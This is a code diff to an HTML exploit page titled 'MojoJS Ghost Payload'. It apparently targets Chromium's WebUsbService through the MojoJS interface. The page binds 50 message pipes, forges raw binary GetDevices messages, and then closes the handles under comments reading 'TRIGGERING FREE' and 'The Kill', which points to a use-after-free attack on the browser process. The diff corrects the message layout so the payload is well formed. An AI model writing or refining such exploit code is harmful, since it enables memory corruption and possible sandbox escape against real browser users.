@@ -5,7 +5,7 @@
     <script src="gen/mojo/public/js/bindings.js"></script>
 </head>
 <body>
-    <h1>MojoJS Ghost Payload (Raw Binary)</h1>
+    <h1>MojoJS9 Ghost Payload (Valid9 Binary)</h1>
     <script type="module">
         import { WebUsbService } from './gen/third_party/blink/public/mojom/usb/web_usb_service.mojom.m.js';
 
@@ -19,32 +19,32 @@
             let pipes = [];
             
             for(let i = 0; i < 50; i++) {
-                // 1. Create the raw native message pipe
                 let pipe = Mojo.createMessagePipe();
-                
-                // 2. Bind the Browser Process end
                 Mojo.bindInterface(WebUsbService.$interfaceName, pipe.handle0);
-                
-                // Keep track of the JS end
                 pipes.push(pipe.handle1);
             }
 
-            console.log("[+] Bound 50 pipes. Forging raw binary GetDevices message...");
+            console.log("[+] Bound 50 pipes. Forging valid binary GetDevices message...");
             
-            // 3. Construct the exact 24-byte Mojo Message Header for GetDevices (Ordinal 1)
-            // Header struct: [Size (uint32), Version (uint32), Interface ID (uint32), Message Name/Ordinal (uint32), Flags (uint32), Trace ID (uint32)]
-            let buffer = new ArrayBuffer(24);
+            // Construct the exact 32-byte Mojo Message 
+            let buffer = new ArrayBuffer(32);
             let view = new DataView(buffer);
-            view.setUint32(0, 24, true); // Size: 24 bytes
-            view.setUint32(4, 1, true);  // Version: 1
-            view.setUint32(8, 0, true);  // Interface ID: 0 (default)
+            
+            // --- 1. MOJO MESSAGE HEADER (24 bytes) ---
+            view.setUint32(0, 24, true); // Header Size: 24 bytes
+            view.setUint32(4, 1, true);  // Header Version: 1
+            view.setUint32(8, 0, true);  // Interface ID: 0 
             view.setUint32(12, 1, true); // Message Ordinal: 1 (GetDevices)
             view.setUint32(16, 1, true); // Flags: 1 (Expects response)
             view.setUint32(20, 0, true); // Trace ID: 0
             
+            // --- 2. METHOD PAYLOAD STRUCT (8 bytes) ---
+            // Even empty methods require an 8-byte struct header
+            view.setUint32(24, 8, true); // Struct Size: 8 bytes
+            view.setUint32(28, 0, true); // Struct Version: 0
+            
             for(let p of pipes) {
-                // 4. Send the raw binary message directly to C++
-                // We bypass all JS wrapper classes.
+                // Send the perfectly formed binary message directly to C++
                 p.writeMessage(buffer, []);
             }
 
@@ -53,7 +53,7 @@
 
             console.log("[!] TRIGGERING FREE...");
             
-            // 5. The Kill: Close the native handles
+            // The Kill: Close the native handles
             for(let p of pipes) {
                 p.close();
             }
